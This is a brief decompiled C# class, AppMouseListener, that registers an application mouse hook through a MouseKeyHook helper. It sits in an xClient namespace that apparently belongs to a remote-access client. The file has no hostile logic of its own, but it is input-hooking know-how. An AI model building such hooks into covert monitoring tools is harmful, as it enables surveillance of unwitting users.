using System;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x02000060 RID: 96
	internal class AppMouseListener : MouseListener
	{
		// Token: 0x060002AA RID: 682 RVA: 0x0000337B File Offset: 0x0000157B
		public AppMouseListener() : base(new Subscribe(HookHelper.HookAppMouse))
		{
		}

		// Token: 0x060002AB RID: 683 RVA: 0x0000338F File Offset: 0x0000158F
		protected override MouseEventExtArgs GetEventArgs(CallbackData data)
		{
			return MouseEventExtArgs.FromRawDataApp(data);
		}
	}
}
